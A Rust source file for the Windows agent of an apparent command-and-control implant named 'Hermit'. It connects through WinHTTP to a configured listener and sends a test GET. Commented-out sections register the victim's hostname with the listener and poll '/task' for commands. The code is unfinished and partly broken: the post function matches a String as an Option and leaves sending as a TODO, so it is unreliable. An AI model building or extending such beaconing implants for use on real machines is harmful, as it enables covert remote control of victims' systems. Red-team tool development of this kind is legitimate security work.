// References:
//  - https://github.com/Steve-xmh/alhc/blob/main/src/windows/mod.rs
//  - https://github.com/youyuanwu/winasio-rs/blob/c4bb4cd0d9bf7b0e944d2fd4b9487f2cfa7c4f9e/src/winhttp/mod.rs
use std::ffi::c_void;
use std::thread;
use std::time;
use windows::{
    core::{Error, HSTRING, PCWSTR, w},
    Win32::{
        Networking::WinHttp::*,
        System::SystemInformation::GetComputerNameExA,
    }
};

use crate::agents::RegisterAgent;
use crate::Config;
use crate::handlers::handlers_windows::Handlers;
use crate::systeminfo::systeminfo_windows::{get_computer_name, get_systeminfo};

pub fn run(config: Config) -> Result<(), Error> {
    let mut h = Handlers::new();
    
    let sleep = time::Duration::from_secs(config.sleep);

    let mut agent = HSTRING::from("Hermit");

    if let Err(e) = h.open_session(agent) {
        println!("Error opening session: {}", e);
        return Err(e);
    };

    if let Err(e) = h.connect(
        HSTRING::from(config.listener.host.to_string()),
        config.listener.port,
    ) {
        println!("Error connection: {}", e);
        return Err(e);
    };

    // Test request hello
    let response = get(&mut h, "/");
    match response {
        Ok(resp) => println!("{resp}"),
        Err(e) => println!("{:?}", e),
    }

    thread::sleep(sleep);
    
    // Get agent info and register
    // let hostname = match get_computer_name() {
    //     Ok(name) => name,
    //     Err(e) => "unknown".to_string(),
    // };
    // let listener_url = format!(
    //     "{}://{}:{}/",
    //     config.listener.proto.to_string(),
    //     config.listener.host.to_string(),
    //     config.listener.port.to_owned(),
    // );

    // let ra = RegisterAgent::new(hostname, listener_url);
    // let ra_json = serde_json::to_string(&ra).unwrap();

    // Register agent
    // send_post_req(&mut state);

    // let response = request(
    //     &mut state,
    //     "/reg".to_string(),
    //     "POST".to_string(),
    //     Some(ra_json),
    // );

    // match response {
    //     Ok(resp) => println!("{resp}"),
    //     Err(e) => println!("Error"),
    // }

    // thread::sleep(sleep);

    // return Ok(());

    // loop {
    //     // TODO: Implement graceful shutdown.

    //     // Check task
    //     request(
    //         &mut state,
    //         config.listener.proto.to_string(),
    //         "/task".to_string(),
    //         "GET".to_string(),
    //         None,
    //     );

    //     thread::sleep(sleep);
    // }

    h.close_handles();

    Ok(())
}

fn get(h: &mut Handlers, url_path: &str) -> Result<String, Error> {
    h.open_request(
        HSTRING::from("GET".to_string()),
        HSTRING::from(url_path.to_string()),
    ).unwrap();

    let result = h.send_req(0, 0);
    if result.is_err() {
        return Err(Error::from_win32());
    }

    let response = h.recv_resp();
    match response {
        Ok(resp) => {
            return Ok(resp);
        },
        Err(e) => {
            println!("Error response: {}", e);
            return Err(e);
        },
    }
}

fn post(h: &mut Handlers, url_path: &str, data: String) -> Result<String, Error> {
    h.open_request(
        HSTRING::from("POST".to_string()),
        HSTRING::from(url_path.to_string()),
    ).unwrap();

    let total_length = match data {
        Some(ref d) => d.len(),
        None => 0,
    };

    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(async {
        tokio::spawn(async move {
            // TODO: implemnt the process to send request


        });
    });

    // let result = h.send_req(totla_length, 0);
    // if result.is_err() {
    //     return Err(Error::from_win32());
    // }

    // for char in d.chars() {
    //     let buf = &[char as u8];
    //     let dw_num_of_bytes_to_write = 1;

    //     let lpdw_num_of_bytes_written_op: *mut u32 = match Some(d.len()) {
    //         Some(op) => op as *mut u32,
    //         None => std::ptr::null_mut(),
    //     };

    //     self.write_data(buf, lpdw_num_of_bytes_written_op);
    //     println!("Write: {}", char.to_string());
    // }

    Ok("test".to_string())
}